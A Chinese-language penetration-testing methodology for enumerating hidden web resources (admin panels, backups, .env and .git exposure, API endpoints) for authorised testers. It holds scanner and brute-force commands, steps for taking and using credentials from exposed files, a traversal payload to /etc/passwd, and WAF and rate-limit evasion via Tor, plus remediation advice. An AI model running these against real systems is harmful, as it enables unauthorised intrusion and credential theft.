# 敏感资源枚举攻击方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对敏感目录、文件和资源的系统性枚举与利用方法论。敏感资源枚举是信息收集阶段的关键技术，用于发现未公开的敏感路径、备份文件、管理接口等目标。

### 1.2 适用范围
- Web 应用目录和文件枚举
- API 端点发现
- 隐藏资源探测
- 备份文件发现
- 管理接口枚举

### 1.3 读者对象
- 渗透测试工程师
- 红队成员
- 安全评估人员

---

## 第二部分：核心渗透技术专题

### 专题：敏感资源枚举攻击

#### 2.1 技术介绍

敏感资源枚举（Sensitive Resource Enumeration）是指通过系统化的方法发现目标系统中未公开的、隐藏的或受保护的资源和路径。这是渗透测试信息收集阶段的核心技术，直接影响后续攻击的成功率。

**枚举的本质目标：**

| 目标类型 | 描述 | 攻击价值 |
|---------|------|---------|
| **管理接口** | 后台管理系统、API 控制台 | 未授权访问、权限提升 |
| **备份文件** | 源码备份、数据库备份 | 源码审计、凭证提取 |
| **配置文件** | .env、config.php 等 | 数据库凭证、API 密钥 |
| **版本控制** | .git、.svn 目录 | 完整源码历史 |
| **API 端点** | 未文档化的 API | 未授权数据访问 |
| **测试资源** | 测试页面、调试接口 | 漏洞利用入口 |

**CWE 映射：**

| CWE 编号 | 描述 |
|---------|------|
| CWE-538 | 文件和目录信息暴露 |
| CWE-200 | 敏感信息暴露 |
| CWE-540 | 源代码中的敏感信息 |
| CWE-541 | 编译产物中的敏感信息 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **开发环境部署** | 开发配置未修改 | 调试页面、测试接口暴露 |
| **运维交接** | 备份文件未清理 | .bak、.old 文件可访问 |
| **CI/CD 部署** | 构建产物包含敏感文件 | .git、.env 被部署 |
| **第三方组件** | 默认示例应用未删除 | 示例应用存在已知漏洞 |
| **框架默认配置** | 未修改默认路径 | /admin、/phpinfo 可访问 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**1. 自动化工具扫描**

```bash
# Dirsearch - 快速目录扫描
dirsearch -u https://target.com \
    -e php,html,txt,sql,bak,old,log,git,zip,tar.gz \
    --exclude-extensions gif,jpg,png,css,js \
    -t 50 -R 3 --random-agent

# Gobuster - DNS 和目录扫描
gobuster dir -u https://target.com \
    -w /usr/share/wordlists/dirb/common.txt \
    -x php,txt,bak,old \
    -t 100 -z -k

# Feroxbuster - 快速递归扫描
feroxbuster -u https://target.com \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
    -x php,txt,sql,bak \
    -t 50 --recurse

# Nuclei - 漏洞扫描
nuclei -t http/exposures/ \
    -t http/misconfiguration/ \
    -u https://target.com
```

**2. 常见敏感路径字典**

```
# 管理接口
/admin
/administrator
/manager
/console
/dashboard
/wp-admin
/phpmyadmin
/cpanel

# 配置文件
/.env
/.env.local
/.env.production
/config.php
/config/config.php
/web.config
/application.ini
/database.yml

# 备份文件
/backup
/backup.sql
/database.sql
/db.sql
/site.tar.gz
/backup.zip
/config.php.bak
/config.php.old

# 版本控制
/.git
/.git/config
/.git/HEAD
/.svn
/.svn/entries

# 日志文件
/logs
/logs/access.log
/logs/error.log
/var/log/app.log

# 调试/测试
/debug
/phpinfo.php
/info.php
/test
/temp
/tmp

# API 端点
/api
/api/v1
/api/v2
/graphql
/swagger
/api-docs
```

**3. 基于内容的发现**

```bash
# 检查 robots.txt
curl https://target.com/robots.txt

# 检查 sitemap.xml
curl https://target.com/sitemap.xml

# 检查 HTML 注释
curl https://target.com/ | grep -o "<!--.*-->"

# 检查 JS 文件中的路径
curl https://target.com/static/app.js | \
    grep -oE "['\"`](/[^'\"`\s]*)['\"`]" | sort -u
```

**4. 搜索引擎利用**

```
# Google Dorks
site:target.com ext:php | ext:txt | ext:log
site:target.com inurl:admin | inurl:login
site:target.com intitle:"index of"
site:target.com "parent directory"

# 查看缓存版本
cache:target.com/admin

# 查找相关文件
site:target.com ext:bak | ext:old | ext:backup
```

##### 2.3.2 白盒测试

**1. 源码路径分析**

```python
# 审计路由配置
# Django urls.py
# Flask app.routes
# Express app.use()
# Spring @RequestMapping

# 查找硬编码路径
grep -r "href=" src/ | grep -v "^Binary"
grep -r "redirect" src/ | grep -v "^Binary"
grep -r "include" src/ | grep -v "^Binary"
```

**2. 构建产物分析**

```bash
# 检查 Docker 镜像
docker history target-image
docker run --rm target-image ls -la /app

# 检查构建脚本
cat Dockerfile
cat docker-compose.yml
cat Jenkinsfile

# 检查部署配置
cat .deployment/config.yml
```

#### 2.4 漏洞利用方法

##### 2.4.1 管理接口利用

```bash
# 1. 发现管理接口
dirsearch -u https://target.com -w admin-words.txt

# 2. 尝试默认凭证
curl -u admin:admin https://target.com/admin/

# 3. 暴力破解
hydra -L users.txt -P passwords.txt \
    https://target.com http-post-form "/admin/login:user=^USER^&pass=^PASS^:Invalid"

# 4. 未授权访问测试
curl https://target.com/admin/users
curl https://target.com/admin/config
```

##### 2.4.2 备份文件利用

```bash
# 1. 下载备份文件
curl https://target.com/config.php.bak -o config.php.bak
curl https://target.com/site.tar.gz -o site.tar.gz

# 2. 分析配置文件
cat config.php.bak
# 提取数据库凭证、API 密钥等

# 3. 解压源码备份
tar -xzf site.tar.gz
# 审计源码漏洞

# 4. 恢复数据库
mysql -u root < backup.sql
```

##### 2.4.3 Git 源码恢复

```bash
# 1. 检测 .git 目录
curl https://target.com/.git/config
# 返回：[core] repositoryformatversion = 0

# 2. 使用 GitHack 恢复
git clone https://github.com/lijiejie/GitHack
python GitHack.py https://target.com/.git/

# 3. 恢复后分析
cd target.com
git log          # 查看提交历史
git show <hash>  # 查看具体提交
git diff         # 查看代码变更

# 4. 查找敏感信息
grep -r "password" .
grep -r "api_key" .
grep -r "secret" .
```

##### 2.4.4 配置文件利用

```bash
# 1. 下载 .env 文件
curl https://target.com/.env -o env.txt

# 2. 分析内容
cat env.txt
# 可能包含：
# DB_HOST=localhost
# DB_DATABASE=app
# DB_USERNAME=root
# DB_PASSWORD=secret123
# API_KEY=sk-xxxxx
# AWS_SECRET_ACCESS_KEY=xxxxx

# 3. 利用凭证
mysql -u root -psecret123 -h target.com

# 4. 访问云服务
aws s3 ls --access-key xxx --secret-key xxx
```

##### 2.4.5 API 端点利用

```bash
# 1. 发现 API 端点
dirsearch -u https://target.com -w api-words.txt

# 2. 枚举 API 资源
curl https://target.com/api/v1/users
curl https://target.com/api/v1/admin
curl https://target.com/api/v1/config

# 3. 测试未授权访问
curl https://target.com/api/v1/users/1
curl https://target.com/api/v1/users/1/delete

# 4. 检查 Swagger/OpenAPI
curl https://target.com/swagger/v1/swagger.json
curl https://target.com/api-docs
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 WAF 绕过

| 绕过技术 | 描述 | 示例 |
|---------|------|------|
| **URL 编码** | 编码特殊字符 | `%2e%2e%2f` |
| **双重编码** | 多次 URL 编码 | `%252e%252e%252f` |
| **大小写混合** | 绕过大小写敏感过滤 | `/AdMiN` |
| **添加后缀** | 绕过精确匹配 | `/admin/`、`/admin.php` |
| **路径遍历** | 使用特殊路径 | `/..;/admin` |

```bash
# URL 编码绕过
curl https://target.com/%61dmin -i

# 双重编码
curl https://target.com/%252e%252e%252fetc/passwd -i

# 大小写混合（IIS）
curl https://target.com/ADMIN -i

# 添加无关参数
curl https://target.com/admin?debug=true -i
```

##### 2.5.2 速率限制绕过

```bash
# 1. 使用代理池
proxychains dirsearch -u https://target.com

# 2. 添加延迟
gobuster dir -u https://target.com -D 100ms

# 3. 随机 User-Agent
dirsearch -u https://target.com --random-agent

# 4. IP 轮换
# 使用 Tor 网络
torify dirsearch -u https://target.com
```

##### 2.5.3 隐藏路径发现

```bash
# 1. 模糊测试特殊字符
dirsearch -u https://target.com \
    --suffix "~" -e php.bak,php.old

# 2. 测试编辑器临时文件
curl https://target.com/.DS_Store
curl https://target.com/Thumbs.db
curl https://target.com/.viminfo

# 3. 测试 IDE 配置
curl https://target.com/.idea/
curl https://target.com/.vscode/
curl https://target.com/.project
```

---

## 第三部分：附录

### 3.1 敏感资源枚举检查清单

```
□ 扫描常见管理路径
□ 扫描备份文件
□ 扫描配置文件
□ 扫描版本控制目录
□ 扫描日志文件
□ 扫描调试/测试资源
□ 扫描 API 端点
□ 检查 robots.txt
□ 检查 sitemap.xml
□ 检查 HTML/JS 注释
□ 搜索引擎枚举
□ 自动化工具扫描
□ 测试 WAF 绕过
□ 分析发现的文件
```

### 3.2 推荐字典

| 字典名称 | 用途 | 来源 |
|---------|------|------|
| **dirb/common.txt** | 通用目录 | SecLists |
| **raft-medium-directories** | 中等规模目录 | SecLists |
| **raft-large-directories** | 大规模目录 | SecLists |
| **admin-words.txt** | 管理路径 | SecLists |
| **api-words.txt** | API 端点 | SecLists |
| **backup-extensions.txt** | 备份扩展名 | 自定义 |

### 3.3 自动化工具

| 工具名称 | 用途 | 特点 |
|---------|------|------|
| **Dirsearch** | 目录扫描 | 快速、支持递归 |
| **Gobuster** | 目录/DNS 扫描 | 多线程、模式匹配 |
| **Feroxbuster** | 快速扫描 | Rust 编写、极快 |
| **Nuclei** | 漏洞扫描 | 模板化、可扩展 |
| **ffuf** | 快速 Fuzzing | 高度可定制 |

### 3.4 修复建议

- [ ] **移除不必要的文件** - 删除备份、测试、调试文件
- [ ] **配置访问控制** - 限制敏感路径访问
- [ ] **使用 .gitignore** - 防止敏感文件提交
- [ ] **实施 WAF 规则** - 阻止目录扫描
- [ ] **配置错误页面** - 统一 404 响应
- [ ] **定期审计** - 检查文件暴露情况
- [ ] **使用构建过滤** - 防止敏感文件部署

---

**参考资源：**
- [OWASP WSTG-CONF-04: Review Old Backup and Unreferenced Files](https://owasp.org/www-project-web-security-testing-guide/)
- [SecLists - 渗透测试字典](https://github.com/danielmiessler/SecLists)
- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory](https://cwe.mitre.org/data/definitions/538.html)
